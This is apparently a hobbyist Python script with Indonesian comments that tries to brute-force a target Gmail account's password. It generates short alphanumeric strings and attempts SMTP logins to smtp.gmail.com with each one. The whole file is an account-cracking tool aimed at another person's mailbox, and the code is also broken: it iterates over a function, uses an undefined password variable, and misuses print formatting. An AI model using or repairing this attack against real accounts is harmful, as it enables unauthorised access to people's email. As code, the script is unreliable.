#Code By Kang Santuy
#Recode aja cil gk ngapa2
import itertools 
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Masukan Gmail Target: ")
def print_perms(chars, minlen, maxlen): 
    for n in range(minlen, maxlen+1): 
        for perm in itertools.product(chars, repeat=n): 
            print(''.join(perm)) 

print_perms("abcdefghijklmnopqrstuvwxyz1234567890", 2, 4)

for symbols in print_perms:
    try:
        smtpserver.login(user, password)

        print ("[+] Password Bener: %s") % symbols
        break;
    except smtplib.SMTPAuthenticationError:
        print ("[!] Password salah: %s") % symbols
